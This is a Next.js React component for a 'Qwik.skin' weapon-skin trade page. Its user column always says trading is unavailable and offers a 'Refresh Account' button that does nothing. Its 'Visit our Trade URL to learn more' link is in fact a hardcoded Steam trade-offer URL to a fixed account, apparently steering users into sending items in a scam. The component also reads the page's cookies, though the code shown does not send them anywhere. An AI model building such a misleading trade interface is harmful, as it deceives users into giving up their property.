"use client";

import { useSession } from "next-auth/react";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

import { motion, AnimatePresence } from "framer-motion";
import { demoData } from "@/lib/demo-data";
import { CustomAccordion } from "@/components/ui/custom-accordion";
import Image from "next/image";
import GunListHeader from "@/components/gunListHeader";
import MiddleRow from "@/components/middleRow";
import { MappedGuns } from "@/components/mappedGuns";
import { SmallScreenTrade } from "@/components/smallScreenTrade";
import ResponsiveToggle from "@/components/ResponsiveToggle";

export default function TradePage() {
  const { data: session, status } = useSession();
  const router = useRouter();
  const [cookieInfo, setCookieInfo] = useState<string>("Checking cookies...");
  const [host, setHost] = useState<string>("Checking hostname...");
  const [priceRange, setPriceRange] = useState<number[]>([0, 10000]);

  // Responsive toggle state
  const [activeColumn, setActiveColumn] = useState<"user" | "site" | null>(
    "user",
  );

  // Helper to format value
  function formatCurrency(val: number) {
    if (val < 1000) return val.toFixed(2);
    return val.toFixed(0);
  }

  const [minInput, setMinInput] = useState(formatCurrency(priceRange[0]));
  const [maxInput, setMaxInput] = useState(formatCurrency(priceRange[1]));

  // Keep input fields in sync with slider
  useEffect(() => {
    setMinInput(formatCurrency(priceRange[0]));
    setMaxInput(formatCurrency(priceRange[1]));
  }, [priceRange]);

  useEffect(() => {
    if (typeof window !== "undefined") {
      const cookies = document.cookie;
      setCookieInfo(cookies || "No cookies found");
      setHost(window.location.hostname);
    }
  }, []);

  useEffect(() => {
    const timer = setTimeout(() => {
      if (status === "unauthenticated") {
        console.log("User is not authenticated, redirecting to home");
        router.push("/");
      }
    }, 1000);

    return () => clearTimeout(timer);
  }, [status, router]);

  return (
    <div className="min-h-screen h-screen bg-[#1A1625] relative w-screen flex justify-center overflow-hidden pr-8 pl-3 max-[950px]:flex-col max-[950px]:pr-1 max-[950px]:pl-0">
      {/* Responsive Toggle Bar */}
      <ResponsiveToggle
        activeColumn={activeColumn}
        setActiveColumn={setActiveColumn}
      />

      {/* Animated Inventory Columns for Small Screens and Normal for Large Screens */}
      <div className="w-full flex-1 flex">
        {/* Large screens: show both columns as before */}
        <div className="w-full flex min-[951px]:flex max-[950px]:hidden">
          {/* Left Column (User Inventory) */}
          <div className="bg-[#1A1625] basis-3/6 p-4 pb-0 h-full flex-col gap-4 flex">
            <CustomAccordion
              title="You Offer"
              value={0}
              className="max-[950px]:hidden"
              contentClassName="bg-[#2D2438] h-[150px] text-white"
              headerClassName="bg-[#2D2438] text-white"
              headerText="You Offer"
              isRev={true}
            >
              Add the items you want to trade with Qwik.skin
            </CustomAccordion>
            <div className="w-full h-[100%] bg-[#1A1625] rounded-xl rounded-b-none overflow-hidden">
              <div className="h-[60px] w-full bg-white/5 max-[950px]:hidden">
                <GunListHeader isRev={true} />
              </div>
              <div className="h-[100%] mt-[2px] w-[100%] scrollbar-slim-change pb-[30px] overflow-y-scroll overflow-x-visible flex flex-col items-center justify-center">
                <div className="p-6 text-center overflow-y-auto bg-[#1A1625] scrollbar-slim-change gap-4 flex flex-col items-center justify-center rounded-lg px-16 w-full mx-auto">
                  <div className="flex justify-center mb-2">
                    <svg
                      className="text-[#ff000070] w-12 h-12"
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        fill="currentColor"
                        d="M12 5.99L19.53 19H4.47L12 5.99M12 2L1 21h22L12 2zm1 14h-2v2h2v-2zm0-6h-2v4h2v-4z"
                      />
                    </svg>
                  </div>
                  <h3
                    style={{ fontFamily: "var(--font-space)" }}
                    className="text-2xl font-bold mb-2"
                  >
                    Trade mode not available
                  </h3>
                  <p
                    style={{ fontFamily: "var(--font-space)" }}
                    className="text-md tracking-wide text-gray-300/70 mb-6"
                  >
                    Your account is not available to trade.
                    <br />
                    More information should be displayed as you try to send a
                    trade offer.
                  </p>
                  <div className="mb-6">
                    <a
                      href="https://steamcommunity.com/tradeoffer/new/?partner=1157767128&token=650gzNAe"
                      target="_blank"
                      className="flex items-center justify-between bg-[#2D2438] hover:bg-[#1A1625] transition-colors p-3 rounded-md mb-4"
                    >
                      <div className="text-sm">
                        Visit our Trade URL to learn more
                      </div>
                      <svg
                        aria-hidden="true"
                        focusable="false"
                        data-icon="arrow-right"
                        role="img"
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 24 24"
                        className="w-5 h-5 text-[#9D5CFF]"
                      >
                        <path
                          fill="currentColor"
                          d="M4,11V13H16L10.5,18.5L11.92,19.92L19.84,12L11.92,4.08L10.5,5.5L16,11H4Z"
                        ></path>
                      </svg>
                    </a>
                    <div className="text-xs text-gray-400/70 p-3 rounded-md">
                      <p>
                        Trade is temporarily disabled after changing the
                        password, device, or mobile authenticator. Cancelling
                        escrow trade puts your account on a 7-day trade
                        cooldown.
                      </p>
                    </div>
                  </div>
                  <button className="bg-transparent border border-[#9D5CFF]/20 hover:bg-[#9D5CFF]/10 transition-colors py-2 px-6 rounded-md text-sm">
                    Refresh Account
                  </button>
                </div>
              </div>
            </div>
          </div>
          {/* Middle Column */}
          <div className={`max-[950px]:hidden  basis-2/12`}>
            <MiddleRow
              priceRange={priceRange}
              setPriceRange={setPriceRange}
              minInput={minInput}
              setMinInput={setMinInput}
              maxInput={maxInput}
              setMaxInput={setMaxInput}
            />
          </div>
          {/* Right Column (Site Inventory) */}
          <div className="basis-3/6 p-4 pb-0 flex flex-col gap-4 h-full ">
            <CustomAccordion
              title="You Recieve"
              value={0}
              className=""
              contentClassName="bg-[#2D2438] h-[150px] text-white"
              headerClassName="bg-[#2D2438] text-white"
              headerText="You Recieve"
              isRev={false}
            >
              Add the items you want to recieve from our inventory
            </CustomAccordion>
            <div className="w-[calc(100%+4px)] h-[100%] rounded-xl rounded-b-none overflow-hidden border border-[#1A1625]">
              <GunListHeader isRev={false} />
              <MappedGuns isResponsive={false} />
              <div className="h-[60px] w-full bg-[#2D2438] flex items-center px-6" />
            </div>
          </div>
        </div>
        <SmallScreenTrade activeColumn={activeColumn} />
      </div>
    </div>
  );
}
